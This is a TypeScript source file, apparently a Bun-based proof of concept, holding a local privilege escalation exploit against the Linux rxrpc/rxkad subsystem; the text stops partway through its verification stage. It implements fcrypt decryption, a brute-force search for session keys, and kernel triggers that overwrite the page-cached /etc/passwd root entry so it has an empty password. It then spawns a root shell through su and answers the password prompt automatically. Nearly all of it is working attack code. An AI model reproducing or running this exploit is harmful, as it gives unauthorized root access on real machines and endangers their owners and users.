const FC_SBOX1_RAW = new Uint8Array([
  0x77, 0x14, 0xa6, 0xfe, 0xb2, 0x5e, 0x8c, 0x3e, 0x67, 0x6c, 0xa1, 0x0d, 0xc2,
  0xa2, 0xc1, 0x85, 0x6c, 0x7b, 0x67, 0xc6, 0x23, 0xe3, 0xf2, 0x89, 0x50, 0x9c,
  0x03, 0xb7, 0x73, 0xe6, 0xe1, 0x39, 0x31, 0x2c, 0x27, 0x9f, 0xa5, 0x69, 0x44,
  0xd6, 0x23, 0x83, 0x98, 0x7d, 0x3c, 0xb4, 0x2d, 0x99, 0x1c, 0x1f, 0x8c, 0x20,
  0x03, 0x7c, 0x5f, 0xad, 0xf4, 0xfa, 0x95, 0xca, 0x76, 0x44, 0xcd, 0xb6, 0xb8,
  0xa1, 0xa1, 0xbe, 0x9e, 0x54, 0x8f, 0x0b, 0x16, 0x74, 0x31, 0x8a, 0x23, 0x17,
  0x04, 0xfa, 0x79, 0x84, 0xb1, 0xf5, 0x13, 0xab, 0xb5, 0x2e, 0xaa, 0x0c, 0x60,
  0x6b, 0x5b, 0xc4, 0x4b, 0xbc, 0xe2, 0xaf, 0x45, 0x73, 0xfa, 0xc9, 0x49, 0xcd,
  0x00, 0x92, 0x7d, 0x97, 0x7a, 0x18, 0x60, 0x3d, 0xcf, 0x5b, 0xde, 0xc6, 0xe2,
  0xe6, 0xbb, 0x8b, 0x06, 0xda, 0x08, 0x15, 0x1b, 0x88, 0x6a, 0x17, 0x89, 0xd0,
  0xa9, 0xc1, 0xc9, 0x70, 0x6b, 0xe5, 0x43, 0xf4, 0x68, 0xc8, 0xd3, 0x84, 0x28,
  0x0a, 0x52, 0x66, 0xa3, 0xca, 0xf2, 0xe3, 0x7f, 0x7a, 0x31, 0xf7, 0x88, 0x94,
  0x5e, 0x9c, 0x63, 0xd5, 0x24, 0x66, 0xfc, 0xb3, 0x57, 0x25, 0xbe, 0x89, 0x44,
  0xc4, 0xe0, 0x8f, 0x23, 0x3c, 0x12, 0x52, 0xf5, 0x1e, 0xf4, 0xcb, 0x18, 0x33,
  0x1f, 0xf8, 0x69, 0x10, 0x9d, 0xd3, 0xf7, 0x28, 0xf8, 0x30, 0x05, 0x5e, 0x32,
  0xc0, 0xd5, 0x19, 0xbd, 0x45, 0x8b, 0x5b, 0xfd, 0xbc, 0xe2, 0x5c, 0xa9, 0x96,
  0xef, 0x70, 0xcf, 0xc2, 0x2a, 0xb3, 0x61, 0xad, 0x80, 0x48, 0x81, 0xb7, 0x1d,
  0x43, 0xd9, 0xd7, 0x45, 0xf0, 0xd8, 0x8a, 0x59, 0x7c, 0x57, 0xc1, 0x79, 0xc7,
  0x34, 0xd6, 0x43, 0xdf, 0xe4, 0x78, 0x16, 0x06, 0xda, 0x92, 0x76, 0x51, 0xe1,
  0xd4, 0x70, 0x03, 0xe0, 0x2f, 0x96, 0x91, 0x82, 0x80,
]);
const FC_SBOX2_RAW = new Uint8Array([
  0xf0, 0x37, 0x24, 0x53, 0x2a, 0x03, 0x83, 0x86, 0xd1, 0xec, 0x50, 0xf0, 0x42,
  0x78, 0x2f, 0x6d, 0xbf, 0x80, 0x87, 0x27, 0x95, 0xe2, 0xc5, 0x5d, 0xf9, 0x6f,
  0xdb, 0xb4, 0x65, 0x6e, 0xe7, 0x24, 0xc8, 0x1a, 0xbb, 0x49, 0xb5, 0x0a, 0x7d,
  0xb9, 0xe8, 0xdc, 0xb7, 0xd9, 0x45, 0x20, 0x1b, 0xce, 0x59, 0x9d, 0x6b, 0xbd,
  0x0e, 0x8f, 0xa3, 0xa9, 0xbc, 0x74, 0xa6, 0xf6, 0x7f, 0x5f, 0xb1, 0x68, 0x84,
  0xbc, 0xa9, 0xfd, 0x55, 0x50, 0xe9, 0xb6, 0x13, 0x5e, 0x07, 0xb8, 0x95, 0x02,
  0xc0, 0xd0, 0x6a, 0x1a, 0x85, 0xbd, 0xb6, 0xfd, 0xfe, 0x17, 0x3f, 0x09, 0xa3,
  0x8d, 0xfb, 0xed, 0xda, 0x1d, 0x6d, 0x1c, 0x6c, 0x01, 0x5a, 0xe5, 0x71, 0x3e,
  0x8b, 0x6b, 0xbe, 0x29, 0xeb, 0x12, 0x19, 0x34, 0xcd, 0xb3, 0xbd, 0x35, 0xea,
  0x4b, 0xd5, 0xae, 0x2a, 0x79, 0x5a, 0xa5, 0x32, 0x12, 0x7b, 0xdc, 0x2c, 0xd0,
  0x22, 0x4b, 0xb1, 0x85, 0x59, 0x80, 0xc0, 0x30, 0x9f, 0x73, 0xd3, 0x14, 0x48,
  0x40, 0x07, 0x2d, 0x8f, 0x80, 0x0f, 0xce, 0x0b, 0x5e, 0xb7, 0x5e, 0xac, 0x24,
  0x94, 0x4a, 0x18, 0x15, 0x05, 0xe8, 0x02, 0x77, 0xa9, 0xc7, 0x40, 0x45, 0x89,
  0xd1, 0xea, 0xde, 0x0c, 0x79, 0x2a, 0x99, 0x6c, 0x3e, 0x95, 0xdd, 0x8c, 0x7d,
  0xad, 0x6f, 0xdc, 0xff, 0xfd, 0x62, 0x47, 0xb3, 0x21, 0x8a, 0xec, 0x8e, 0x19,
  0x18, 0xb4, 0x6e, 0x3d, 0xfd, 0x74, 0x54, 0x1e, 0x04, 0x85, 0xd8, 0xbc, 0x1f,
  0x56, 0xe7, 0x3a, 0x56, 0x67, 0xd6, 0xc8, 0xa5, 0xf3, 0x8e, 0xde, 0xae, 0x37,
  0x49, 0xb7, 0xfa, 0xc8, 0xf4, 0x1f, 0xe0, 0x2a, 0x9b, 0x15, 0xd1, 0x34, 0x0e,
  0xb5, 0xe0, 0x44, 0x78, 0x84, 0x59, 0x56, 0x68, 0x77, 0xa5, 0x14, 0x06, 0xf5,
  0x2f, 0x8c, 0x8a, 0x73, 0x80, 0x76, 0xb4, 0x10, 0x86,
]);
const FC_SBOX3_RAW = new Uint8Array([
  0xa9, 0x2a, 0x48, 0x51, 0x84, 0x7e, 0x49, 0xe2, 0xb5, 0xb7, 0x42, 0x33, 0x7d,
  0x5d, 0xa6, 0x12, 0x44, 0x48, 0x6d, 0x28, 0xaa, 0x20, 0x6d, 0x57, 0xd6, 0x6b,
  0x5d, 0x72, 0xf0, 0x92, 0x5a, 0x1b, 0x53, 0x80, 0x24, 0x70, 0x9a, 0xcc, 0xa7,
  0x66, 0xa1, 0x01, 0xa5, 0x41, 0x97, 0x41, 0x31, 0x82, 0xf1, 0x14, 0xcf, 0x53,
  0x0d, 0xa0, 0x10, 0xcc, 0x2a, 0x7d, 0xd2, 0xbf, 0x4b, 0x1a, 0xdb, 0x16, 0x47,
  0xf6, 0x51, 0x36, 0xed, 0xf3, 0xb9, 0x1a, 0xa7, 0xdf, 0x29, 0x43, 0x01, 0x54,
  0x70, 0xa4, 0xbf, 0xd4, 0x0b, 0x53, 0x44, 0x60, 0x9e, 0x23, 0xa1, 0x18, 0x68,
  0x4f, 0xf0, 0x2f, 0x82, 0xc2, 0x2a, 0x41, 0xb2, 0x42, 0x0c, 0xed, 0x0c, 0x1d,
  0x13, 0x3a, 0x3c, 0x6e, 0x35, 0xdc, 0x60, 0x65, 0x85, 0xe9, 0x64, 0x02, 0x9a,
  0x3f, 0x9f, 0x87, 0x96, 0xdf, 0xbe, 0xf2, 0xcb, 0xe5, 0x6c, 0xd4, 0x5a, 0x83,
  0xbf, 0x92, 0x1b, 0x94, 0x00, 0x42, 0xcf, 0x4b, 0x00, 0x75, 0xba, 0x8f, 0x76,
  0x5f, 0x5d, 0x3a, 0x4d, 0x09, 0x12, 0x08, 0x38, 0x95, 0x17, 0xe4, 0x01, 0x1d,
  0x4c, 0xa9, 0xcc, 0x85, 0x82, 0x4c, 0x9d, 0x2f, 0x3b, 0x66, 0xa1, 0x34, 0x10,
  0xcd, 0x59, 0x89, 0xa5, 0x31, 0xcf, 0x05, 0xc8, 0x84, 0xfa, 0xc7, 0xba, 0x4e,
  0x8b, 0x1a, 0x19, 0xf1, 0xa1, 0x3b, 0x18, 0x12, 0x17, 0xb0, 0x98, 0x8d, 0x0b,
  0x23, 0xc3, 0x3a, 0x2d, 0x20, 0xdf, 0x13, 0xa0, 0xa8, 0x4c, 0x0d, 0x6c, 0x2f,
  0x47, 0x13, 0x13, 0x52, 0x1f, 0x2d, 0xf5, 0x79, 0x3d, 0xa2, 0x54, 0xbd, 0x69,
  0xc8, 0x6b, 0xf3, 0x05, 0x28, 0xf1, 0x16, 0x46, 0x40, 0xb0, 0x11, 0xd3, 0xb7,
  0x95, 0x49, 0xcf, 0xc3, 0x1d, 0x8f, 0xd8, 0xe1, 0x73, 0xdb, 0xad, 0xc8, 0xc9,
  0xa9, 0xa1, 0xc2, 0xc5, 0xe3, 0xba, 0xfc, 0x0e, 0x25,
]);

// ── Expanded S-boxes (Uint32Array for fast indexed access) ───────────────────

export const fc_sbox0 = new Uint32Array(256);
export const fc_sbox1 = new Uint32Array(256);
export const fc_sbox2 = new Uint32Array(256);
export const fc_sbox3 = new Uint32Array(256);

export function fcryptInitSboxes(): void {
  for (let i = 0; i < 256; i++) {
    // htobe32(x) on LE x86 = bswap32(x) = htonl(x)
    fc_sbox0[i] = htonl(FC_SBOX0_RAW[i] << 3);
    fc_sbox1[i] = htonl(
      (((FC_SBOX1_RAW[i] & 0x1f) << 27) | (FC_SBOX1_RAW[i] >>> 5)) >>> 0,
    );
    fc_sbox2[i] = htonl(FC_SBOX2_RAW[i] << 11);
    fc_sbox3[i] = htonl(FC_SBOX3_RAW[i] << 19);
  }
}

// ── 56-bit right-rotation (BigInt) ───────────────────────────────────────────

function fcRor56(k: bigint, n: bigint): bigint {
  return (k >> n) | ((k & ((1n << n) - 1n)) << (56n - n));
}

// ── fcrypt_user_setkey → returns sched[16] as Uint32Array ────────────────────

export function fcryptSetkey(key: Uint8Array | Buffer): Uint32Array {
  let k = 0n;
  for (let i = 0; i < 8; i++) {
    k = (k << 7n) | BigInt(key[i] >> 1);
  }
  const sched = new Uint32Array(16);
  for (let i = 0; i < 16; i++) {
    sched[i] = htonl(Number(k & 0xffffffffn));
    k = fcRor56(k, 11n);
  }
  return sched;
}

// ── fcrypt_user_decrypt ───────────────────────────────────────────────────────
//
// FC_F(R_, L_, sched_): L_ ^= sbox0[b0(sched_^R_)] ^ sbox1[b1] ^ sbox2[b2] ^ sbox3[b3]
// Decrypt applies sched in reverse order (0xf → 0x0), alternating R/L.

export function fcryptDecrypt(
  sched: Uint32Array,
  inBuf: Uint8Array | Buffer,
): Uint8Array {
  let L =
    (inBuf[0] | (inBuf[1] << 8) | (inBuf[2] << 16) | (inBuf[3] << 24)) >>> 0;
  let R =
    (inBuf[4] | (inBuf[5] << 8) | (inBuf[6] << 16) | (inBuf[7] << 24)) >>> 0;

  // inline FC_F for performance: L_ ^= f(R_ ^ sched)
  const fcF = (r: number, s: number): number => {
    const u = (s ^ r) >>> 0;
    return (
      (fc_sbox0[u & 0xff] ^
        fc_sbox1[(u >>> 8) & 0xff] ^
        fc_sbox2[(u >>> 16) & 0xff] ^
        fc_sbox3[(u >>> 24) & 0xff]) >>>
      0
    );
  };

  R = (R ^ fcF(L, sched[0xf])) >>> 0;
  L = (L ^ fcF(R, sched[0xe])) >>> 0;
  R = (R ^ fcF(L, sched[0xd])) >>> 0;
  L = (L ^ fcF(R, sched[0xc])) >>> 0;
  R = (R ^ fcF(L, sched[0xb])) >>> 0;
  L = (L ^ fcF(R, sched[0xa])) >>> 0;
  R = (R ^ fcF(L, sched[0x9])) >>> 0;
  L = (L ^ fcF(R, sched[0x8])) >>> 0;
  R = (R ^ fcF(L, sched[0x7])) >>> 0;
  L = (L ^ fcF(R, sched[0x6])) >>> 0;
  R = (R ^ fcF(L, sched[0x5])) >>> 0;
  L = (L ^ fcF(R, sched[0x4])) >>> 0;
  R = (R ^ fcF(L, sched[0x3])) >>> 0;
  L = (L ^ fcF(R, sched[0x2])) >>> 0;
  R = (R ^ fcF(L, sched[0x1])) >>> 0;
  L = (L ^ fcF(R, sched[0x0])) >>> 0;

  const out = new Uint8Array(8);
  out[0] = L & 0xff;
  out[1] = (L >>> 8) & 0xff;
  out[2] = (L >>> 16) & 0xff;
  out[3] = (L >>> 24) & 0xff;
  out[4] = R & 0xff;
  out[5] = (R >>> 8) & 0xff;
  out[6] = (R >>> 16) & 0xff;
  out[7] = (R >>> 24) & 0xff;
  return out;
}

// ── Selftest ──────────────────────────────────────────────────────────────────
// K=0, decrypt(0E0900C73EF7ED41) → 00000000 00000000

export function fcryptSelftest(): boolean {
  const z = new Uint8Array(8);
  const cv = new Uint8Array([0x0e, 0x09, 0x00, 0xc7, 0x3e, 0xf7, 0xed, 0x41]);
  const sched = fcryptSetkey(z);
  const pv = fcryptDecrypt(sched, cv);
  for (let i = 0; i < 8; i++) if (pv[i] !== 0) return false;
  return true;
}

// ── Predicate functions ───────────────────────────────────────────────────────

export type PcheckFn = (P: Uint8Array) => boolean;

export function fcCheckPaNullok(P: Uint8Array): boolean {
  return P[0] === 0x3a && P[1] === 0x3a; // ':' ':'
}
export function fcCheckPbNullok(P: Uint8Array): boolean {
  return P[0] === 0x30 && P[1] === 0x3a; // '0' ':'
}
export function fcCheckPcNullok(P: Uint8Array): boolean {
  if (P[0] !== 0x30 || P[1] !== 0x3a || P[7] !== 0x3a) return false;
  for (let i = 2; i < 7; i++) {
    if (P[i] === 0x3a || P[i] === 0x00 || P[i] === 0x0a) return false;
  }
  return true;
}

// ── fc_splitmix64 ─────────────────────────────────────────────────────────────

const SM_C1 = 0x9e3779b97f4a7c15n;
const SM_C2 = 0xbf58476d1ce4e5b9n;
const SM_C3 = 0x94d049bb133111ebn;
const U64M = 0xffffffffffffffffn;

function fcSplitmix64(s: bigint): [bigint /*result*/, bigint /*new_s*/] {
  const ns = (s + SM_C1) & U64M;
  let z = ns;
  z = ((z ^ (z >> 30n)) * SM_C2) & U64M;
  z = ((z ^ (z >> 27n)) * SM_C3) & U64M;
  return [z ^ (z >> 31n), ns];
}

// ── find_K_offline_generic ────────────────────────────────────────────────────
//
// Pure userspace brute-force: for each random K, decrypt C → P and test the
// predicate.  Returns { K, P } on success, null if exhausted.
//
// Note: BigInt-heavy; JS throughput is ~30–50× slower than native C.
// Typical search completes in seconds to minutes depending on the predicate.

// ═══════════════════════════════════════════════════════════════════════════════
// PART 6 — rxrpc_lpe_main · run_root_pty · main
// ═══════════════════════════════════════════════════════════════════════════════

// (C2 removed — exec/signal/dprintf now use the main dlopen symbols)

// ── Already-patched checks ────────────────────────────────────────────────────

const SU_MARKER = new Uint8Array([
  0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
]);

function suAlreadyPatched(): boolean {
  const fd = openFd("/usr/bin/su", O_RDONLY, 0) as number;
  if (fd < 0) return false;
  const got = Buffer.alloc(8);
  const n = C.pread64(fd, ptr(got), 8n, 0x78n) as bigint;
  C.close(fd);
  return n === 8n && SU_MARKER.every((b, i) => got[i] === b);
}

function passwdAlreadyPatched(): boolean {
  const fd = openFd("/etc/passwd", O_RDONLY, 0) as number;
  if (fd < 0) return false;
  const head = Buffer.alloc(16);
  const n = C.pread64(fd, ptr(head), 16n, 0n) as bigint;
  C.close(fd);
  return n >= 9n && head.subarray(0, 9).toString("ascii") === "root::0:0";
}

function eitherTargetPatched(): boolean {
  return suAlreadyPatched() || passwdAlreadyPatched();
}

// ── stderr silence / restore ──────────────────────────────────────────────────

function silenceStderr(): number {
  const saved = C.dup(STDERR_FILENO) as number;
  const dn = openFd("/dev/null", O_WRONLY, 0) as number;
  if (dn >= 0) {
    C.dup2(dn, STDERR_FILENO);
    C.close(dn);
  }
  return saved;
}

function restoreStderr(saved: number): void {
  if (saved >= 0) {
    C.dup2(saved, STDERR_FILENO);
    C.close(saved);
  }
}

// ── exec helpers ──────────────────────────────────────────────────────────────

function execSuLogin(): void {
  for (const p of ["/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su"]) {
    C.execl(cstr(p), cstr("su"), cstr("-"), null);
  }
  C.execlp(cstr("su"), cstr("su"), cstr("-"), null, null);
}

// ── run_root_pty ──────────────────────────────────────────────────────────────

const SIZEOF_TERMIOS = 60; // glibc x86_64
const SIZEOF_WINSIZE = 8;

function runRootPty(): number {
  const master = C.posix_openpt(O_RDWR | O_NOCTTY) as number;
  if (master < 0) return -1;
  if ((C.grantpt(master) as number) < 0 || (C.unlockpt(master) as number) < 0) {
    C.close(master);
    return -1;
  }
  const slaveNamePtr = C.ptsname(master) as number;
  if (!slaveNamePtr) {
    C.close(master);
    return -1;
  }
  const slaveName = readCStr(slaveNamePtr);

  const ws = Buffer.alloc(SIZEOF_WINSIZE, 0);
  if ((C.ioctl(STDIN_FILENO, TIOCGWINSZ, ptr(ws)) as number) === 0)
    C.ioctl(master, TIOCSWINSZ, ptr(ws));

  // Pre-allocate every buffer the child will need BEFORE fork().
  // After fork() only the calling thread survives; any JS allocation in the
  // child (Buffer.from, cstr, etc.) can trigger JSC GC on a dead thread → SIGILL.
  const slaveNameBuf = cstr(slaveName);
  const ioctlBuf     = Buffer.alloc(4, 0);   // dummy arg for TIOCSCTTY
  // execSuLogin paths — pre-built cstr buffers for each candidate
  const suPaths = ["/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su"]
    .map(p => ({ path: cstr(p), arg0: cstr("su"), arg1: cstr("-") }));
  const suFallback = { path: cstr("su"), arg0: cstr("su"), arg1: cstr("-") };

  const pid = C.fork() as number;
  if (pid < 0) {
    C.close(master);
    return -1;
  }

  if (pid === 0) {
    // child: only raw FFI calls — no JS allocations allowed
    C.setsid();
    const slave = _openFFI(slaveNameBuf, O_RDWR, 0) as number;
    if (slave < 0) C._exit(127);
    C.ioctl(slave, TIOCSCTTY, ioctlBuf);
    C.dup2(slave, 0); C.dup2(slave, 1); C.dup2(slave, 2);
    if (slave > 2) C.close(slave);
    C.close(master);
    for (const { path, arg0, arg1 } of suPaths)
      C.execl(path, arg0, arg1, null);
    C.execlp(suFallback.path, suFallback.arg0, suFallback.arg1, null, null);
    C._exit(127);
  }

  // parent: raw mode + bridge — SIG_IGN = (void*)1
  C.signal(SIGTTOU, 1);
  C.signal(SIGTTIN, 1);
  C.signal(SIGPIPE, 1);
  C.signal(SIGHUP, 1);
  C.setpgid(0, 0);
  C.tcsetpgrp(STDIN_FILENO, C.getpid() as number);

  const savedTermios = Buffer.alloc(SIZEOF_TERMIOS, 0);
  let restoreTermios = false;
  if ((C.tcgetattr(STDIN_FILENO, ptr(savedTermios)) as number) === 0) {
    const raw = Buffer.from(savedTermios);
    C.cfmakeraw(ptr(raw));
    if ((C.tcsetattr(STDIN_FILENO, TCSANOW, ptr(raw)) as number) === 0)
      restoreTermios = true;
  }

  let autoPwSent = false;
  let stdinEof = false;
  let sawMasterOutput = false;
  let totalMs = 0;
  const buf = Buffer.alloc(4096);

  loop: for (;;) {
    const pfds = Buffer.alloc(2 * SIZEOF_POLLFD, 0);
    pfds.writeInt32LE(stdinEof ? -1 : STDIN_FILENO, 0);
    pfds.writeInt16LE(POLLIN, 4);
    pfds.writeInt32LE(master, 8);
    pfds.writeInt16LE(POLLIN, 12);

    C.poll(ptr(pfds), 2, 200);
    totalMs += 200;

    const r1 = pfds.readInt16LE(14); // master revents
    const r0 = pfds.readInt16LE(6); // stdin  revents

    if (r1 & POLLIN) {
      const n = C.read(master, ptr(buf), BigInt(buf.length)) as bigint;
      if (n <= 0n) break loop;
      sawMasterOutput = true;
      C.write(STDOUT_FILENO, ptr(buf), n);
      if (!autoPwSent && n < BigInt(buf.length)) {
        const s = buf.subarray(0, Number(n)).toString("ascii");
        if (s.includes("Password") || s.includes("password")) {
          const nl = Buffer.from("\n");
          C.write(master, ptr(nl), 1n);
          autoPwSent = true;
        }
      }
    }
    if (!stdinEof && r0 & POLLIN) {
      const n = C.read(STDIN_FILENO, ptr(buf), BigInt(buf.length)) as bigint;
      if (n <= 0n) stdinEof = true;
      else C.write(master, ptr(buf), n);
    }
    if (r1 & (POLLHUP | POLLERR)) break loop;

    if (!autoPwSent && !sawMasterOutput && totalMs >= 1500) {
      const nl = Buffer.from("\n");
      C.write(master, ptr(nl), 1n);
      autoPwSent = true;
    }

    const wstatus = Buffer.alloc(4, 0);
    const w = C.waitpid(pid, ptr(wstatus), WNOHANG) as number;
    if (w === pid) {
      // drain any remaining output
      for (let i = 0; i < 5; i++) {
        const pf = Buffer.alloc(SIZEOF_POLLFD, 0);
        pf.writeInt32LE(master, 0);
        pf.writeInt16LE(POLLIN, 4);
        if ((C.poll(ptr(pf), 1, 50) as number) <= 0) break;
        const n = C.read(master, ptr(buf), BigInt(buf.length)) as bigint;
        if (n <= 0n) break;
        C.write(STDOUT_FILENO, ptr(buf), n);
      }
      break loop;
    }
  }

  if (restoreTermios) C.tcsetattr(STDIN_FILENO, TCSANOW, ptr(savedTermios));
  C.close(master);
  return 0;
}

// ── rxrpc_lpe_main ────────────────────────────────────────────────────────────

export function rxrpcLpeMain(argv: string[]): number {
  process.stderr.write("\n=== rxrpc/rxkad LPE EXPLOIT (uid=1000 → root) ===\n");
  process.stderr.write(
    `[*] uid=${C.getuid()} euid=${C.geteuid()} gid=${C.getgid()}\n`,
  );

  // optional user+net namespace unshare
  const noUnshare = getEnv("POC_NO_UNSHARE");
  if (!noUnshare || noUnshare[0] !== "1") {
    const doUnshare = getEnv("POC_UNSHARE");
    if (doUnshare && doUnshare[0] === "1") {
      if (doUnshareUsernsNetns() < 0) return 1;
    }
  }

  // Try to load rxrpc kernel module, then probe with a dummy socket.
  {
    progress("rxrpc: attempting modprobe rxrpc...");
    const mp = Bun.spawnSync(["modprobe", "rxrpc"]);
    if (mp.exitCode !== 0) {
      progress(`rxrpc: modprobe failed (exit=${mp.exitCode}) — module may be built-in or unavailable`);
    } else {
      progress("rxrpc: modprobe rxrpc OK");
    }

    const dummy = C.socket(AF_RXRPC, SOCK_DGRAM, PF_RXRPC) as number;
    if (dummy < 0) {
      progress(`rxrpc: socket(AF_RXRPC) failed: ${errStr()} — kernel has no rxrpc support, cannot continue`);
      WARN(`socket(AF_RXRPC): ${errStr()} — module not loadable?`);
      return 1;
    }
    C.close(dummy);
    progress("rxrpc: module loaded, dummy socket OK");
    LOG("rxrpc module autoloaded via dummy socket(AF_RXRPC)");
  }

  // open target file
  const targetPath = getEnv("POC_TARGET_FILE") || "/etc/passwd";
  const rfdRo = openFd(targetPath, O_RDONLY, 0) as number;
  if (rfdRo < 0) {
    WARN(`open ${targetPath} RO: ${errStr()}`);
    return 1;
  }

  const stBuf = Buffer.alloc(144, 0); // stat (x86_64 = 144 bytes)
  C.fstat(rfdRo, ptr(stBuf));
  const stSize = stBuf.readBigInt64LE(STAT_OFF_SIZE);
  if (stSize < 32n) {
    WARN(`target too small: ${stSize}`);
    return 1;
  }
  const stUid = stBuf.readUInt32LE(28);
  const stGid = stBuf.readUInt32LE(32);
  const stMode = stBuf.readUInt32LE(24) & 0o7777;
  LOG(
    `target ${targetPath} opened RO, size=${stSize}, uid=${stUid} gid=${stGid} mode=${stMode.toString(8).padStart(4, "0")}`,
  );

  // mmap first page so the page-cache page stays pinned
  const mapPtr = C.mmap(0, 4096n, PROT_READ, MAP_SHARED, rfdRo, 0n) as number;
  if (mapPtr === -1) {
    WARN(`mmap: ${errStr()}`);
    return 1;
  }
  LOG(`mmap'd ${targetPath} page-cache at 0x${mapPtr.toString(16)}`);

  const mapBuf = toBuffer(mapPtr, 0, Math.min(4096, Number(stSize)));

  // check if already patched
  if (mapBuf.subarray(0, 9).toString("ascii") === "root::0:0") {
    LOG("/etc/passwd already patched (root::0:0...) — nothing to do");
    return 0;
  }
  process.stderr.write("[*] /etc/passwd line 1 first 16 bytes: ");
  for (let i = 0; i < 16; i++)
    process.stderr.write(mapBuf[i].toString(16).padStart(2, "0") + " ");
  process.stderr.write("\n");

  process.stderr.write("[*] /etc/passwd line 1 (root entry) BEFORE: '");
  for (let i = 0; i < 32; i++) {
    const c = mapBuf[i];
    process.stderr.write(
      c === 0x0a ? "$" : c >= 32 && c < 127 ? String.fromCharCode(c) : ".",
    );
  }
  process.stderr.write("'\n");

  // ── STAGE 1 — three-splice offline brute-force ────────────────────────────
  const offA = 4,
    offB = 6,
    offC = 8;
  const Ca = new Uint8Array(8),
    Cb = new Uint8Array(8),
    Cc = new Uint8Array(8);

  const tmpA = Buffer.alloc(8);
  C.pread64(rfdRo, ptr(tmpA), 8n, BigInt(offA));
  Ca.set(tmpA);
  const tmpB = Buffer.alloc(8);
  C.pread64(rfdRo, ptr(tmpB), 8n, BigInt(offB));
  Cb.set(tmpB);
  const tmpC = Buffer.alloc(8);
  C.pread64(rfdRo, ptr(tmpC), 8n, BigInt(offC));
  Cc.set(tmpC);

  progress("rxrpc: initialising fcrypt S-boxes...");
  fcryptInitSboxes();

  // selftest
  if (!fcryptSelftest()) {
    WARN("fcrypt selftest FAILED");
    return 1;
  }
  LOG("fcrypt selftest OK");

  let maxIters = 10_000_000_000n;
  const miStr = getEnv("LPE_MAX_ITERS");
  if (miStr) maxIters = BigInt(miStr);

  const timeNow = Number(C.time(0) as bigint);
  let seedBase =
    (BigInt(timeNow) * 0x100000001n) ^ BigInt(C.getpid() as number);
  const seStr = getEnv("LPE_SEED");
  if (seStr) seedBase = BigInt(seStr);

  progress(
    `rxrpc: brute-force maxIters=${maxIters} seed=0x${seedBase.toString(16)}`,
  );
  process.stderr.write(
    '\n=== STAGE 1a: search K_A (chars 4-5 := "::")  prob ~1.5e-5 ===\n',
  );
  const resA = findKOfflineGeneric(
    Ca,
    maxIters,
    fcCheckPaNullok,
    seedBase,
    "K_A",
  );
  if (!resA) {
    WARN("K_A search exhausted");
    return 2;
  }

  // Cb_actual = Pa[2..7] + Cb[6..7]
  const CbActual = new Uint8Array(8);
  CbActual.set(resA.P.subarray(2, 8), 0);
  CbActual.set(Cb.subarray(6, 8), 6);
  LOG(
    `Cb_actual (after splice A) = ${[...CbActual].map((b) => b.toString(16).padStart(2, "0")).join("")}`,
  );

  process.stderr.write(
    '\n=== STAGE 1b: search K_B (chars 6-7 := "0:")  prob ~1.5e-5 ===\n',
  );
  const resB = findKOfflineGeneric(
    CbActual,
    maxIters,
    fcCheckPbNullok,
    seedBase ^ 0xa5a5a5a5a5a5a5a5n,
    "K_B",
  );
  if (!resB) {
    WARN("K_B search exhausted");
    return 2;
  }

  // Cc_actual = Pb[2..7] + Cc[6..7]
  const CcActual = new Uint8Array(8);
  CcActual.set(resB.P.subarray(2, 8), 0);
  CcActual.set(Cc.subarray(6, 8), 6);
  LOG(
    `Cc_actual (after splice B) = ${[...CcActual].map((b) => b.toString(16).padStart(2, "0")).join("")}`,
  );

  process.stderr.write(
    '\n=== STAGE 1c: search K_C (chars 8-15 := "0:GGGGGG:")  prob ~5.4e-8 ===\n',
  );
  const resC = findKOfflineGeneric(
    CcActual,
    maxIters,
    fcCheckPcNullok,
    seedBase ^ 0x5a5a5a5a5a5a5a5an,
    "K_C",
  );
  if (!resC) {
    WARN("K_C search exhausted");
    return 2;
  }

  // preview
  process.stderr.write(
    '\n[+] Predicted post-corruption /etc/passwd line 1:\n    "root',
  );
  for (let i = 0; i < 2; i++) {
    const c = resA.P[i];
    process.stderr.write(c >= 32 && c < 127 ? String.fromCharCode(c) : ".");
  }
  for (let i = 0; i < 2; i++) {
    const c = resB.P[i];
    process.stderr.write(c >= 32 && c < 127 ? String.fromCharCode(c) : ".");
  }
  for (let i = 0; i < 8; i++) {
    const c = resC.P[i];
    process.stderr.write(c >= 32 && c < 127 ? String.fromCharCode(c) : ".");
  }
  process.stderr.write('/root:/bin/bash"\n');

  // ── STAGE 2 — three kernel triggers in order A → B → C ───────────────────
  process.stderr.write(
    `\n=== STAGE 2a: kernel trigger A @ off ${offA} (set chars 4-5 "::") ===\n`,
  );
  SESSION_KEY.set(resA.K);
  if (doOneTrigger(rfdRo, offA, 8) < 0) {
    WARN("kernel trigger A failed");
    return 3;
  }

  process.stderr.write(
    `\n=== STAGE 2b: kernel trigger B @ off ${offB} (set chars 6-7 "0:") ===\n`,
  );
  SESSION_KEY.set(resB.K);
  if (doOneTrigger(rfdRo, offB, 8) < 0) {
    WARN("kernel trigger B failed");
    return 3;
  }

  process.stderr.write(
    `\n=== STAGE 2c: kernel trigger C @ off ${offC} (set chars 8-15 "0:GGGGGG:") ===\n`,
  );
  SESSION_KEY.set(resC.K);
  if (doOneTrigger(rfdRo, offC, 8) < 0) {
    WARN("kernel trigger C failed");
    return 3;
  }

  // ── post-trigger verification via mmap ───────────────────────────────────
  process.stderr.write("[*] /etc/passwd line 1 (root entry) AFTER:  '");
  for (let i = 0; i < 32; i++) {
    const c = mapBuf[i];
    process.stderr.write(
      c === 0x0a ? "$" : c >= 32 && c < 127 ? String.fromCharCode(c) : ".",
    );
  }
  process.stderr.write("'\n");

  const ok =
    mapBuf[4] === 0x3a &&
    mapBuf[5] === 0x3a &&
    mapBuf[6] === 0x30 &&
    mapBuf[7] === 0x3a &&
    mapBuf[8] === 0x30 &&
    mapBuf[9] === 0x3a &&
    mapBuf[15] === 0x3a;
  if (!ok) {
    WARN("post-trigger sanity check failed — char layout off");
    return 4;
  }
  process.stderr.write(
    "\n[!!!] HIT — root entry now has empty passwd field, uid=0, gid=0, " +
      "dir=/root, shell=/bin/bash.\n",
  );

  // ── STAGE 3 — verify via getent passwd root ───────────────────────────────
  process.stderr.write(
    "\n=== STAGE 3: independent verify via `getent passwd root` ===\n",
  );
  {
    const pFds = Buffer.alloc(8, 0);
    if ((C.pipe(ptr(pFds)) as number) === 0) {
      const pr = pFds.readInt32LE(0),
        pw = pFds.readInt32LE(4);
      // Pre-allocate before fork — no JS alloc in child
